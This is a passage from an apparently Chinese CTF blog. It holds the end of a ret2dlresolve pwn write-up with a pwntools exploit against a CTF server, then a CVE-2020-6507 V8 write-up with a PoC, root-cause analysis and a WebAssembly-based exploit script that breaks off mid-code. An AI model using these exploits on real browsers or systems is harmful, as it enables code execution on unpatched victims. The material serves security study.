class="hljs-comment">//取出.got.plt段地址，reloc-&gt;r_offset为got表偏移</span><br>   <span class="hljs-comment">//l-&gt;l_addr为pie基地址</span><br>……<br><span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Addr)</span><br><span class="hljs-title function_">elf_machine_fixup_plt</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> link_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">lookup_t</span> t,</span><br><span class="hljs-params">       <span class="hljs-type">const</span> ElfW(Sym) *refsym, <span class="hljs-type">const</span> ElfW(Sym) *sym,</span><br><span class="hljs-params">       <span class="hljs-type">const</span> ElfW(Rela) *reloc,</span><br><span class="hljs-params">       ElfW(Addr) *reloc_addr,</span><br><span class="hljs-params">       ElfW(Addr) value)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> *reloc_addr = value;<br>&#125;<br></code></pre></td></tr></table></figure><p>puts的got表就在free后面所以pie基址加8就行</p><p>伪造出来的结构大概这样</p><img src="/2023/06/27/ret2dlresolve/%E5%9B%BE.jpg" class title="图"><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26613</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Age &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">b&#x27;\x80&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Photo(URL) &gt;&gt; &#x27;</span>,p64(<span class="hljs-number">0xfbad1887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\xb0\x5d&#x27;</span>)<br>pie=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-elf.symbols[<span class="hljs-string">&#x27;stderr&#x27;</span>]<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(pie + <span class="hljs-number">0x4140</span> - <span class="hljs-number">0x67</span>) + <span class="hljs-string">b&#x27;system\x00&#x27;</span><br>payload=payload.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)+<span class="hljs-string">b&#x27;\x08&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;Name &gt;&gt; &#x27;</span>,payload)<br>payload = p64(pie + <span class="hljs-number">0x8</span>).ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(pie + <span class="hljs-number">0x4140</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Hobby &gt;&gt; &#x27;</span>,payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pie))<br>p.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Stack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2dlresolve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-6507</title>
    <link href="/2023/04/17/CVE-2020-6507/"/>
    <url>/2023/04/17/CVE-2020-6507/</url>
    
    <content type="html"><![CDATA[<p>CVE！*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。<br>一些碎碎念：折腾了快两周了还没摸清楚怎么学V8，先恶补了一些V8的理论之后本来想看源码，但V8的源码过于复杂，在倔强地挣扎了一周后我放弃了这个想法，打算先按照博客学漏洞，走一步看一步(。_。)</p><span id="more"></span><p>bug编号1086890，受影响的Chrome最高版本为83.0.4103.97，受影响的V8最高版本为8.3.110.9 </p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>先贴poc：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript">array = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">1.1</span>);<br>args = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>).<span class="hljs-title function_">fill</span>(array);<br>args.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span> - <span class="hljs-number">4</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">2.2</span>));<br>giant_array = <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">concat</span>.<span class="hljs-title function_">apply</span>([], args);<br>giant_array.<span class="hljs-title function_">splice</span>(giant_array.<span class="hljs-property">length</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>);<br><br>length_as_double =<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>([<span class="hljs-number">0x2424242400000000n</span>]).<span class="hljs-property">buffer</span>)[<span class="hljs-number">0</span>];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">array</span>) &#123;<br>  <span class="hljs-keyword">var</span> x = array.<span class="hljs-property">length</span>;<br>  x -= <span class="hljs-number">67108861</span>;<br>  x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x, <span class="hljs-number">0</span>);<br>  x *= <span class="hljs-number">6</span>;<br>  x -= <span class="hljs-number">5</span>;<br>  x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x, <span class="hljs-number">0</span>);<br><br>  <span class="hljs-keyword">let</span> corrupting_array = [<span class="hljs-number">0.1</span>, <span class="hljs-number">0.1</span>];<br>  <span class="hljs-keyword">let</span> corrupted_array = [<span class="hljs-number">0.1</span>];<br><br>  corrupting_array[x] = length_as_double;<br>  <span class="hljs-keyword">return</span> [corrupting_array, corrupted_array];<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30000</span>; ++i) &#123;<br>  <span class="hljs-title function_">trigger</span>(giant_array);<br>&#125;<br><br>corrupted_array = <span class="hljs-title function_">trigger</span>(giant_array)[<span class="hljs-number">1</span>];<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;corrupted array length: &#x27;</span> + corrupted_array.<span class="hljs-property">length</span>.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>corrupted_array[<span class="hljs-number">0x123456</span>];<br></code></pre></td></tr></table></figure><p>这个漏洞的成因是用Turque编写的NewFixedArray和NewFixedDoubleArray没有对数组大小的判断</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//src\objects\fixed-array.tq</span><br><br>macro <span class="hljs-title class_">NewFixedArray</span>&lt;<span class="hljs-title class_">Iterator</span>: type&gt;(<span class="hljs-attr">length</span>: intptr, <span class="hljs-attr">it</span>: <span class="hljs-title class_">Iterator</span>): <span class="hljs-title class_">FixedArray</span> &#123;<br>  <span class="hljs-keyword">if</span> (length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> kEmptyFixedArray;<br>  <span class="hljs-keyword">if</span> (length &gt; kFixedArrayMaxLength) deferred &#123;<br>      <span class="hljs-attr">runtime</span>::<span class="hljs-title class_">FatalProcessOutOfMemoryInvalidArrayLength</span>(kNoContext);<br>    &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span><br>  <span class="hljs-title class_">FixedArray</span>&#123;<span class="hljs-attr">map</span>: kFixedArrayMap, <span class="hljs-attr">length</span>: <span class="hljs-title class_">Convert</span>&lt;<span class="hljs-title class_">Smi</span>&gt;(length), <span class="hljs-attr">objects</span>: ...it&#125;;<br>&#125;<br><br>macro <span class="hljs-title class_">NewFixedDoubleArray</span>&lt;<span class="hljs-title class_">Iterator</span>: type&gt;(<br>    <span class="hljs-attr">length</span>: intptr, <span class="hljs-attr">it</span>: <span class="hljs-title class_">Iterator</span>): <span class="hljs-title class_">FixedDoubleArray</span>|<span class="hljs-title class_">EmptyFixedArray</span> &#123;<br>  <span class="hljs-keyword">if</span> (length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> kEmptyFixedArray;<br>  <span class="hljs-keyword">if</span> (length &gt; kFixedDoubleArrayMaxLength) deferred &#123;<br>      <span class="hljs-attr">runtime</span>::<span class="hljs-title class_">FatalProcessOutOfMemoryInvalidArrayLength</span>(kNoContext);<br>    &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FixedDoubleArray</span>&#123;<br>    <span class="hljs-attr">map</span>: kFixedDoubleArrayMap,<br>    <span class="hljs-attr">length</span>: <span class="hljs-title class_">Convert</span>&lt;<span class="hljs-title class_">Smi</span>&gt;(length),<br>    <span class="hljs-attr">floats</span>: ...it<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>源码中规定kFixedDoubleArrayMaxLength &#x3D; 671088612，浮点型数组的最大长度为67108862<br>poc中这一段操作使得giant_array的最终长度为67108863</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">array = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">1.1</span>);<br>args = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>).<span class="hljs-title function_">fill</span>(array);<br>args.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span> - <span class="hljs-number">4</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">2.2</span>));<br>giant_array = <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">concat</span>.<span class="hljs-title function_">apply</span>([], args);<br>giant_array.<span class="hljs-title function_">splice</span>(giant_array.<span class="hljs-property">length</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>);<br></code></pre></td></tr></table></figure><p>漏洞是由于没有检查最大长度造成的，但不是由它触发的，以上步骤正常地创建了一个67108863的数组giant_array<br>看触发漏洞的trigger函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">array</span>) &#123;<br>  <span class="hljs-keyword">var</span> x = array.<span class="hljs-property">length</span>;<br>  x -= <span class="hljs-number">67108861</span>;<br>  x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x, <span class="hljs-number">0</span>);<br>  x *= <span class="hljs-number">6</span>;<br>  x -= <span class="hljs-number">5</span>;<br>  x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x, <span class="hljs-number">0</span>);<br><br>  <span class="hljs-keyword">let</span> corrupting_array = [<span class="hljs-number">0.1</span>, <span class="hljs-number">0.1</span>];<br>  <span class="hljs-keyword">let</span> corrupted_array = [<span class="hljs-number">0.1</span>];<br><br>  corrupting_array[x] = length_as_double;<br>  <span class="hljs-keyword">return</span> [corrupting_array, corrupted_array];<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30000</span>; ++i) &#123;<br>  <span class="hljs-title function_">trigger</span>(giant_array);<br>&#125;<br></code></pre></td></tr></table></figure><p>执行30000次是为了触发jit优化，会删除一些冗余代码<br>在优化trigger函数的时候，V8认为x的最大长度为67108862，那么x最后的计算结果最大值为1，那么x最后的值不是0就是1，corrupting_array的长度为2，不论对其0还是1赋值都是有效的。原本代码在执行corrupting_array[x]执行的时候，会根据x的值对corrupting_array边界进行检查，但是通过上述的分析，JIT认为这种边界检查是没有必要的，就把检查的代码给删除了。这样就直接对corrupting_array[x]进行赋值，而实际的x值为7，这就造成了越界读写，而index&#x3D;7这个位置，正好是corrupted_array变量的elements和length位，所以poc达到了之前分析的那种效果</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>又是一波碎碎念：V8漏洞利用是根据“从0开始学V8漏洞利用”系列学习的，这个博客的第一种方法十分玄学，代码有一点改动都会导致一切重来，甚至连DebugPrint都会造成地址变动，所以我放弃了这种方法，直接开始优化过的利用<br>优化过的poc如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript">array = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">1.1</span>);<br>args = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>).<span class="hljs-title function_">fill</span>(array);<br>args.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span> - <span class="hljs-number">4</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">2.2</span>));<br>giant_array = <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">concat</span>.<span class="hljs-title function_">apply</span>([], args);<br>giant_array.<span class="hljs-title function_">splice</span>(giant_array.<span class="hljs-property">length</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>);<br><br><br>length_as_double =<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>([<span class="hljs-number">0x22222222n</span>]).<span class="hljs-property">buffer</span>)[<span class="hljs-number">0</span>];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">array, oob</span>) &#123;<br>  <span class="hljs-keyword">var</span> x = array.<span class="hljs-property">length</span>;<br>  x -= <span class="hljs-number">67108861</span>; <span class="hljs-comment">// 1 2</span><br>  x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x, <span class="hljs-number">0</span>);<br>  x *= <span class="hljs-number">10</span>; <span class="hljs-comment">// 10 20</span><br>  x -= <span class="hljs-number">9</span>; <span class="hljs-comment">// 1 11</span><br>  x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x, <span class="hljs-number">0</span>);<br>  oob[x] = length_as_double; <span class="hljs-comment">// fake length</span><br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30000</span>; ++i) &#123;<br>  vul = [<span class="hljs-number">1.1</span>, <span class="hljs-number">2.1</span>];<br>  pad = [vul];<br>  double_array = [<span class="hljs-number">3.1</span>];<br>  obj = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">2.1</span>&#125;;<br>  obj_array = [obj];<br>  <span class="hljs-title function_">trigger</span>(giant_array, vul);<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;length = &quot;</span>, double_array.<span class="hljs-property">length</span>.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br></code></pre></td></tr></table></figure><p>for循环中申请的几个对象的内存布局大概是这样的：</p><img src="/2023/04/17/CVE-2020-6507/%E5%86%85%E5%AD%98.png" class title="内存"><img src="/2023/04/17/CVE-2020-6507/vul.png" class title="vul"><img src="/2023/04/17/CVE-2020-6507/pad.png" class title="pad"><img src="/2023/04/17/CVE-2020-6507/doublearray.png" class title="doublearray"><img src="/2023/04/17/CVE-2020-6507/obj.png" class title="obj"><img src="/2023/04/17/CVE-2020-6507/objarray.png" class title="objarray"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript">vul_elements<br>|32bit map addr|32bit length|64bit <span class="hljs-number">1.1</span>|64bit <span class="hljs-number">1.1</span>|<br>vuln<br>|32bit map addr|32bit properties addr|32bit elements addr|32bit length|<br>pad_elements<br>|32bit map addr|32bit length|32bit vuln addr|<br>pad<br>|32bit map addr|32bit properties addr|32bit elements addr|32bit length|<br>double_array_elements<br>|32bit map addr|32bit length|64bit <span class="hljs-number">3.1</span>|<br>double_array<br>|32bit map addr|32bit properties addr|32bit elements addr|32bit length|<br>obj<br>|32bit map addr|32bit properties addr|32bit elements addr|128bit unknown data|<br>obj_array_elements<br>|32bit map addr|32bit length|32bit obj addr|<br>obj_array<br>|32bit map addr|32bit properties addr|32bit elements addr|32bit length|<br></code></pre></td></tr></table></figure><p>第一种方法之所以如此抽象是因为覆盖的时候会将length和elements一起覆盖，修改后的poc利用pad制造了一个偏移，这样覆盖的时候就是覆盖double_array的length和obj的map   </p><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule, &#123;&#125;);<br><span class="hljs-keyword">var</span> f = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><span class="hljs-keyword">var</span> u32 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br>array = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">1.1</span>);<br>args = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>).<span class="hljs-title function_">fill</span>(array);<br>args.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span> - <span class="hljs-number">4</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">2.2</span>));<br>giant_array = <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">concat</span>.<span class="hljs-title function_">apply</span>([], args);<br>giant_array.<span class="hljs-title function_">splice</span>(giant_array.<span class="hljs-property">length</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>);<br><br>length_as_double =<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>([<span class="hljs-number">0x22222222n</span>]).<span class="hljs-property">buffer</span>)[<span class="hljs-number">0</span>];<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">d2u</span>(<span class="hljs-params">v</span>) &#123;<br>  f64[<span class="hljs-number">0</span>] = v;<br>  <span class="hljs-keyword">return</span> u32;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">u2d</span>(<span class="hljs-params">lo, hi</span>) &#123;<br>  u32[<span class="hljs-number">0</span>] = lo;<br>  u32[<span class="hljs-number">1</span>] = hi;<br>  <span class="hljs-keyword">return</span> f64[<span 